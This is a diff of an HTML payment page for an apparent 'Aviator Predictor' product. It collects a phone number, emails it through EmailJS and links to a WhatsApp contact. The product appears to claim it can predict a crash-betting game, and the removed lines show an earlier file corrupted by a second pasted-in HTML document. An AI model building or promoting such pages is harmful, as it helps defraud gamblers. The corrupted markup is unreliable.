@@ -18,52 +18,7 @@
             color: #333;
             padding: 20px;
         }
-        .container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-        }
-        h1 {
-            color: #007bff;
-            margin-bottom: 20px;
-        }
-        input[type="text"] {
-            width: calc(100% - 22px);
-            padding: 12px;
-            margin-bottom: 20px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #007bff;
-            color: white;
-            padding: 14px 25px;
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator Predictor Payment</title>
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            background: linear-gradient(135deg, #6a11cb, #2575fc);
-            color: #333;
-            padding: 20px;
-        }
-        .container {
+      .container {
             background-color: white;
             padding: 30px;
             border-radius: 12px;
@@ -93,24 +48,35 @@
             cursor: pointer;
             font-size: 16px;
         }
-        .float-button {
+      .float-button {
             position: fixed;
             bottom: 20px;
             right: 20px;
-            background-color: red;
+            background-color: black; /* Changed to black */
             color: white;
             padding: 10px 15px;
             border: none;
             border-radius: 50%;
             cursor: pointer;
             z-index: 100;
+            transition: background-color 0.3s ease; /* Added transition */
         }
-        .whatsapp-link {
-            color: #25D366;
-            text-decoration: none;
-            font-weight: bold;
+      .float-button:hover {
+            background-color: red; /* Changed to red on hover */
         }
-        .footer {
+      .whatsapp-button {
+            background-color: #25D366;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            display: inline-block; /* Make it behave like a button */
+            text-decoration: none; /* Remove underline from link */
+            margin-top: 10px;
+        }
+      .footer {
             margin-top: 20px;
             text-align: center;
             color: white;
@@ -133,7 +99,7 @@
     <a href="paid.html" class="float-button">Demo Account</a>
 
     <div class="footer">
-        <p>Need help? Contact us on <a href="https://wa.me/250739121651" class="whatsapp-link" target="_blank">WhatsApp</a></p>
+        <p>Need help? Contact us on <a href="https://wa.me/250739121651" class="whatsapp-button" target="_blank">WhatsApp</a></p>
     </div>
 
     <script>
@@ -152,9 +118,10 @@
             };
 
             emailjs.send('service_k7026ko', 'template_p0of43y', templateParams)
-              .then(function(response) {
+            .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
-                    alert("Payment request sent! Please wait for confirmation.");
+                    // Redirect to product.html on success
+                    window.location.href = "product.html";
                 }, function(error) {
                     console.error('FAILED...', error);
                     alert("Email sending failed. Please try again.");
@@ -166,55 +133,4 @@
     <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 </body>
-</html>￼Enter            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .float-button {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: red;
-            color: white;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 50%;
-            cursor: pointer;
-            z-index: 100;
-        }
-        .whatsapp-link {
-            color: #25D366;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        .footer {
-            margin-top: 20px;
-            text-align: center;
-            color: white;
-  }
-    </style>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function(){
-            emailjs.init("abfC9oICRtMIGM5cb"); // Public Key
-        })();
-    </script>
-</head>
-<body>
-    <div class="container">
-        <h1>Aviator Predictor Payment</h1>
-        <input type="text" id="phoneNumber" placeholder="Enter your mobile number">
-        <button id="payButton">Pay</button>
-    </div>
-
-    <a href="paid.html" class="float-button">Demo Account</a>
-
-    <div class="footer">
-        <p>Need help? Contact us on <a href="https://wa.me/250739121651" class="whatsapp-link" target="_blank">WhatsApp</a></p>
-    </div>
-
-    <script>
-        document.getElementById('payButton').addEventListener('click', function() {
-            const phoneNumber = document.getElementById('phoneNumber').value;
-
+</html>
